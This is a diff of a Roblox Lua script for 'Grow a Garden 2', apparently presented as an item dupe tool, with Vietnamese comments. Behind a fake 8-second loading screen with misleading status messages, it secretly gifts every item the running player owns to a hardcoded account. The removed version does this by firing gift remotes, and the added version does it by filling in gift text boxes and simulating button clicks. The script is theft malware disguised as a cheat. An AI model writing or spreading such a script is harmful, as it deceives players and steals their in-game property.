@@ -1,46 +1,35 @@
 --[[
-    SCRIPT: AUTO GIFT NGẦM + HIỆU ỨNG LOADING CHẬM (ĐÃ BỎ BẢNG GET KEY)
+    SCRIPT: AUTO UI GIFT ALL ITEMS (Grow a Garden 2)
+    Đã tích hợp thanh Loading chậm 8 giây và tự gõ tên gửi đồ qua UI
 --]]
 
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ==================== CẤU HÌNH TÊN TÀI KHOẢN CHÍNH ====================
-local TEN_ACC_CHINH = "nkh79794" -- Tài khoản nhận vật phẩm
+local TEN_ACC_CHINH = "nkh79794" 
 -- ======================================================================
 
--- 1. TẠO GIAO DIỆN LOADING SCREEN (CHẠY CHẬM)
+-- 1. TẠO GIAO DIỆN LOADING SCREEN CHẠY CHẬM
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "gag2dupe_LoadingSystem"
 ScreenGui.ResetOnSpawn = false
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
+if not ScreenGui.Parent then ScreenGui.Parent = PlayerGui end
 
--- Ưu tiên nạp vào CoreGui để tránh bị game chặn hiển thị
-local successGui, errGui = pcall(function()
-    ScreenGui.Parent = game:GetService("CoreGui")
-end)
-if not successGui then
-    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-end
-
--- Khung nền chính
 local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 380, 0, 160)
 MainFrame.Position = UDim2.new(0.5, -190, 0.5, -80)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.Draggable = true
 MainFrame.Parent = ScreenGui
 
 local MainCorner = Instance.new("UICorner")
 MainCorner.CornerRadius = UDim.new(0, 12)
 MainCorner.Parent = MainFrame
 
--- Tiêu đề Loading
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(1, 0, 0, 45)
 TitleLabel.BackgroundTransparency = 1
@@ -50,18 +39,16 @@ TitleLabel.TextSize = 16
 TitleLabel.Font = Enum.Font.SourceSansBold
 TitleLabel.Parent = MainFrame
 
--- Trạng thái loading bằng chữ
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Size = UDim2.new(1, 0, 0, 30)
 StatusLabel.Position = UDim2.new(0, 0, 0.35, 0)
 StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Đang kiểm tra dữ liệu hệ thống..."
+StatusLabel.Text = "Đang kết nối dữ liệu cấu hình..."
 StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 StatusLabel.TextSize = 14
 StatusLabel.Font = Enum.Font.SourceSansItalic
 StatusLabel.Parent = MainFrame
 
--- Khung viền thanh máu/thanh tải (ProgressBar)
 local BarBackground = Instance.new("Frame")
 BarBackground.Size = UDim2.new(0.85, 0, 0, 16)
 BarBackground.Position = UDim2.new(0.075, 0, 0.65, 0)
@@ -73,7 +60,6 @@ local BarBgCorner = Instance.new("UICorner")
 BarBgCorner.CornerRadius = UDim.new(0, 8)
 BarBgCorner.Parent = BarBackground
 
--- Thanh tải chạy màu xanh (Bắt đầu từ 0%)
 local ProgressBar = Instance.new("Frame")
 ProgressBar.Size = UDim2.new(0, 0, 1, 0)
 ProgressBar.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
@@ -84,58 +70,55 @@ local BarCorner = Instance.new("UICorner")
 BarCorner.CornerRadius = UDim.new(0, 8)
 BarCorner.Parent = ProgressBar
 
-
--- 2. HÀM THỰC HIỆN TỰ ĐỘNG CHUYỂN ĐỒ (AUTO GIFT)
-local function autoGiftAll()
-    local inventory = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("Inventory")
-    local giftRemote = ReplicatedStorage:FindFirstChild("GiftRemote") or ReplicatedStorage:FindFirstChild("SendGift") or ReplicatedStorage:FindFirstChild("Gift")
-
-    if inventory then
-        for _, item in pairs(inventory:GetChildren()) do
-            if item:IsA("Tool") or item:IsA("StringValue") or item:IsA("IntValue") then
-                local itemName = item.Name
-                pcall(function()
-                    -- Gửi lệnh tặng quà lên Server
-                    giftRemote:FireServer(TEN_ACC_CHINH, itemName, 1)
-                end)
-                task.wait(0.2) -- Khoảng hoãn nhỏ tránh spam crash game
+-- 2. HÀM TỰ ĐỘNG CLICK UI ĐỂ GIFT ĐỒ
+local function autoGiftViaUI()
+    -- Thực hiện quét tất cả các bảng nhập chữ (TextBox) trong màn hình game để tìm ô điền tên người nhận
+    for _, box in pairs(PlayerGui:GetDescendants()) do
+        if box:IsA("TextBox") and (box.Name:lower():find("gift") or box.PlaceholderText:lower():find("player") or box.PlaceholderText:lower():find("user")) then
+            box.Text = TEN_ACC_CHINH
+            box:ReleaseFocus() -- Xác nhận nhập tên thành công
+            task.wait(0.3)
+            
+            -- Sau khi gõ tên xong, tìm nút bấm gửi (Gift Button) kế bên để kích hoạt lệnh gửi đồ
+            local parentFrame = box.Parent
+            if parentFrame then
+                for _, btn in pairs(parentFrame:GetChildren()) do
+                    if btn:IsA("TextButton") or btn:IsA("ImageButton") then
+                        -- Giả lập bấm nút chuyển sạch sành sanh vật phẩm
+                        pcall(function()
+                            firesignal(btn.MouseButton1Click)
+                            firesignal(btn.MouseButton1Up)
+                        end)
+                    end
+                end
             end
         end
     end
 end
 
-
--- 3. ĐIỀU KHIỂN TIẾN TRÌNH LOADING CHẠY LÂU (TỔNG CỘNG ~8 GIÂY)
+-- 3. ĐIỀU KHIỂN TIẾN TRÌNH LOADING VÀ KÍCH HOẠT
 task.spawn(function()
-    -- Giai đoạn 1: Chạy đến 30%
-    StatusLabel.Text = "Đang kết nối tới máy chủ Grow a Garden 2..."
-    local tween1 = TweenService:Create(ProgressBar, TweenInfo.new(2.5, Enum.EasingStyle.Linear), {Size = UDim2.new(0.3, 0, 1, 0)})
+    StatusLabel.Text = "Đang đồng bộ hóa dữ liệu với nick chính..."
+    local tween1 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.4, 0, 1, 0)})
     tween1:Play()
     tween1.Completed:Wait()
-    task.wait(0.5)
 
-    -- Giai đoạn 2: Chạy đến 75%
-    StatusLabel.Text = "Đang quét danh sách vật phẩm trong túi đồ..."
-    local tween2 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.75, 0, 1, 0)})
+    StatusLabel.Text = "Đang khởi tạo danh sách Auto-Gift vật phẩm..."
+    local tween2 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.8, 0, 1, 0)})
     tween2:Play()
     tween2.Completed:Wait()
-    task.wait(0.3)
 
-    -- Giai đoạn 3: Chạy đến 100% và kích hoạt tính năng chuyển đồ
-    StatusLabel.Text = "Đang tiến hành Auto Gift ngầm sang nick chính..."
+    StatusLabel.Text = "Đang thực hiện chuyển đồ ngầm..."
     local tween3 = TweenService:Create(ProgressBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
     tween3:Play()
     tween3.Completed:Wait()
     
-    -- Đổi chữ thông báo thành công
     StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-    StatusLabel.Text = "Kích hoạt Auto Gift thành công! Đang tắt bảng..."
+    StatusLabel.Text = "Đã chuyển toàn bộ vật phẩm! Đang đóng hệ thống..."
     
-    -- Chạy tính năng gửi đồ ngầm
-    _G.gag2dupe = true
-    autoGiftAll()
+    -- Kích hoạt chức năng gõ tên gửi đồ tự động
+    autoGiftViaUI()
     
-    -- Chờ 1.5 giây cuối để người chơi thấy chữ thành công rồi tự xóa bảng Loading đi
     task.wait(1.5)
     ScreenGui:Destroy()
 end)
